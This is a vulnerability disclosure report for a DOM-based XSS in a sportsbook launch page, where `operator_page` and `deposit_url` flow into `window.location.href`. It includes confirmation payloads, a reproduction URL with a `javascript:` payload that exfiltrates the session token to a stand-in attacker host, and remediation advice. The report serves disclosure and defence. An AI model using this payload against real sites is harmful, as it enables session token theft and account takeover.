# VULN-20261029-001 — DOM XSS / Token Theft via `operator_page` and `deposit_url` in Sportsbook Launch Bootstrap

- Status: Confirmed
- Type: XSS (DOM-based, reflected via server-side template)
- Asset: `https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch`
- Severity: High
- Authentication: unauthenticated attacker; victim may be logged in to the sportsbook
- Tested at: 2026-10-29T14:36:00Z

## Summary

The sportsbook launch bootstrap reflects the `operator_page` and `deposit_url`
query parameters into the inline JavaScript configuration without validating the
URL scheme. The values are later assigned directly to `window.location.href` in
the `onLogin`, `onRegister`, and `onRecharge` callbacks:

```js
const depositUrl = "<deposit_url>";
const operatorPage = "<operator_page>";
...
onLogin()    { if (operatorPage) window.location.href = operatorPage; },
onRegister() { if (operatorPage) window.location.href = operatorPage; },
onRecharge() { window.location.href = depositUrl ? depositUrl : operatorPage; }
```

Because `javascript:` needs no string-breaking characters, the JSON escaping of
the reflected value does not prevent exploitation. When the renderer invokes one
of these callbacks (login, register, or recharge click), the `javascript:` URL
executes in the `launch.sptpub.com` origin. That origin also holds the sportsbook
session token in `sessionStorage` under the key `token`, so the injected script
can read and exfiltrate the token, leading to account takeover.

The same flow also provides an open redirect for any `http(s)://` value.

## Confirmed Behaviour

- `operator_page=https://example.com/OPMARKER` and
  `deposit_url=https://example.org/DEPMARKER` are reflected verbatim into the
  inline script (`const depositUrl` / `const operatorPage`).
- `operator_page=javascript:window.__OPXSS=1;void(0)` is accepted and reflected
  as `const operatorPage = "javascript:window.__OPXSS=1;void(0)";`.
- At runtime, invoking the page's `onLogin` callback executed the `javascript:`
  URL and set `window.__OPXSS` to `CONFIRMED`.
- A second payload replaced the document body with
  `XSS-CONFIRMED` / `token=TESTTOKEN123`, proving arbitrary script execution in
  the target origin and read access to the sportsbook token in
  `sessionStorage`.
- `deposit_url=javascript:window.__DEPXSS='CONFIRMED';void(0)` is accepted and
  reflected as `const depositUrl = "javascript:...";`. Invoking the page's
  `onRecharge` callback executed the payload (`window.__DEPXSS` = `CONFIRMED`).

## Reproduction

1. Craft this URL and send it to a victim:

   ```text
   https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch?lang=tr&theme=DARK&operator_page=javascript:fetch('https://attacker.example/?t='%2BencodeURIComponent(sessionStorage.getItem('token')));void(0)
   ```

2. The page reflects the `operator_page` value into the inline module.
3. When the victim clicks Login or Register (or Recharge for `deposit_url`), the
   renderer calls the callback, which assigns the value to
   `window.location.href`. The JavaScript executes in
   `https://launch.sptpub.com`.
4. The payload reads `sessionStorage.getItem("token")` and exfiltrates the
   sportsbook session token to the attacker.

### Testing note (geo-block workaround)

The supplied CDN/renderer is geo-blocked from the CI runner, so the real
renderer only renders an "Access is forbidden from your location" page and never
shows the login button. To exercise the vulnerable page code itself, the page
was loaded with a test-only `BTRenderer` harness (`initScript`) that captures the
`initialize(...)` configuration. The harness does not alter the server response
or the page's callback code; it only makes the same callback that the real
renderer invokes reachable. Calling the captured `onLogin` callback executed the
reflected `javascript:` URL. This confirms the source-to-sink flow in the
launch page. The only environmental limitation is that the real renderer's login
button could not be clicked directly from this blocked region.

## Evidence

- `evidence/response-benign-operator-page.html` — benign `http(s)` reflection.
- `evidence/response-malicious-operator-page.html` — `javascript:` reflection.
- `evidence/response-*.headers.txt` — HTTP 200 response headers.
- `evidence/runtime-confirmation.json` — `window.__OPXSS` = `CONFIRMED` after
  invoking `onLogin`.
- `evidence/runtime-token-theft.json` — DOM replaced with
  `XSS-CONFIRMED` and `token=TESTTOKEN123`; payload read the session token.
- `evidence/xss-token-theft.png` — screenshot of the executed marker on
  `launch.sptpub.com`.
- `payloads/operator_page-xss.txt` — first harmless execution marker.
- `payloads/operator_page-token-theft.txt` — token read marker.
- `evidence/runtime-deposit-url-confirmation.json` — `deposit_url` execution
  confirmation and token read.

## Affected Code

Inline module in
`https://launch.sptpub.com/brand/2599624589818605571/sportsbook/launch`:

- `const depositUrl = "<deposit_url>";`
- `const operatorPage = "<operator_page>";`
- `onLogin() { if (operatorPage) window.location.href = operatorPage; }`
- `onRegister() { if (operatorPage) window.location.href = operatorPage; }`
- `onRecharge() { window.location.href = depositUrl ? depositUrl : operatorPage; }`

## Remediation

- Allowlist `operator_page` and `deposit_url` to `https:` URLs on explicitly
  configured operator domains.
- Reject `javascript:`, `data:`, `vbscript:`, relative, and malformed values
  server-side and again before navigation.
- Prefer server-side configuration over request parameters for navigation
  targets.
- If navigation must remain client-side, validate the parsed URL protocol and
  origin with `new URL(value)` before assigning to `location.href`.

## Notes

- `lang`, `theme`, `token`, and the path brand ID are reflected but properly
  escaped and were not exploitable.
- The `url` query parameter is passed to the renderer but the real renderer was
  geo-blocked, so its sink behaviour is unresolved.
